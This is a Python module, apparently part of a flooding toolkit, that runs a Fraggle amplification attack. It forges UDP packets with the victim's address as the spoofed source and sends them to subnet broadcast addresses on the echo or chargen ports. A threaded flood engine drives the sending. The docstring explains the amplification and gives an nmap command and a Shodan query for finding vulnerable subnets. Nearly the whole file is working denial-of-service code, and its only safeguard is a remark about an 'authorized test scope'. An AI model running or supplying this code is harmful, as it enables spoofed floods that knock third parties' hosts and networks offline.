"""
modules/fraggle.py - FRAGGLE
Fraggle Attack: UDP echo broadcast amplification.

How it works:
  Classic amplification via UDP broadcast (RFC 862 - UDP Echo service).

  1. Attacker sends UDP packet to broadcast address of a subnet
     Source IP = victim_ip (spoofed)
     Destination = subnet broadcast (e.g. 192.168.1.255)
     Port = 7 (UDP echo) or 19 (chargen)

  2. All hosts on the subnet that run UDP echo service reply to victim_ip
     Each host sends a response to the spoofed source (victim)

  3. Victim receives amplified flood from all hosts on the broadcast domain

  Amplification factor: N hosts on subnet (e.g. /24 = up to 254x)

  Modern status:
    - UDP echo (port 7) disabled by default on modern OS since ~2000
    - Still present on: embedded devices, printers, old Cisco IOS,
      industrial equipment, some managed switches
    - More effective on isolated enterprise subnets with many legacy devices

  Variant - Chargen (port 19):
    Character generator protocol sends continuous stream of characters
    Higher bandwidth per response than echo
    Even more amplification per reflector

  Finding vulnerable subnets:
    nmap -sU -p 7,19 --open <subnet>
    Shodan: port:7 "echo"

  Difference vs Smurf:
    Smurf  = ICMP echo to broadcast (requires ICMP, often filtered)
    Fraggle = UDP echo to broadcast (UDP, different filter profile)
"""

import random
import socket
import struct
import itertools
from floodles.core.packet_builder import random_ip
from floodles.core.sender import FloodEngine

try:
    from scapy.all import IP, UDP, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# Common broadcast amplification ports
UDP_ECHO    = 7    # RFC 862 - echoes back whatever is sent
UDP_CHARGEN = 19   # RFC 864 - generates character stream


def _get_broadcast(network: str) -> str:
    """
    Derive broadcast address from network CIDR or return as-is if it's
    already a broadcast/host address.

    Examples:
      "192.168.1.0/24" -> "192.168.1.255"
      "10.0.0.0/16"    -> "10.0.255.255"
      "192.168.1.255"  -> "192.168.1.255" (already broadcast)
    """
    if "/" not in network:
        return network  # Assume it's already a broadcast or specific IP

    ip_part, prefix = network.split("/")
    prefix = int(prefix)
    ip_int = struct.unpack("!I", socket.inet_aton(ip_part))[0]
    mask   = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    bcast  = ip_int | (~mask & 0xFFFFFFFF)
    return socket.inet_ntoa(struct.pack("!I", bcast))


def run(
    victim_ip: str,
    broadcast_targets: list[str],
    port: int = UDP_ECHO,
    payload_size: int = 64,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
) -> FloodEngine:
    """
    Launch Fraggle UDP broadcast amplification attack.

    Args:
        victim_ip         : Target IP (spoofed source in all packets).
        broadcast_targets : List of broadcast addresses or CIDR networks.
                            e.g. ["192.168.1.255", "10.0.0.0/24"]
                            These must be within the authorized test scope.
        port              : UDP port to target.
                            7  = UDP echo (direct echo back)
                            19 = chargen (higher bandwidth response)
        payload_size      : UDP payload size in bytes.
        threads           : Worker count.
        pps_limit         : PPS cap.
        duration          : Duration in seconds.

    Returns:
        FloodEngine (already started).

    Note:
        Requires hosts on the target subnet to have UDP echo/chargen active.
        Run nmap -sU -p 7,19 <subnet> first to confirm vulnerable hosts.
    """
    if not SCAPY_AVAILABLE:
        raise ImportError("scapy required: pip install scapy")

    # Resolve all broadcast addresses
    broadcasts = [_get_broadcast(t) for t in broadcast_targets]
    bcast_cycle = itertools.cycle(broadcasts)

    def make_packet() -> bytes:
        bcast = next(bcast_cycle)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))

        pkt = IP(
            src=victim_ip,
            dst=bcast,
            # Set broadcast bit in IP flags? Not required, dst=broadcast is enough
        ) / UDP(
            sport=random.randint(1024, 65535),
            dport=port,
        ) / Raw(load=payload)
        return bytes(pkt)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=broadcasts[0],
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
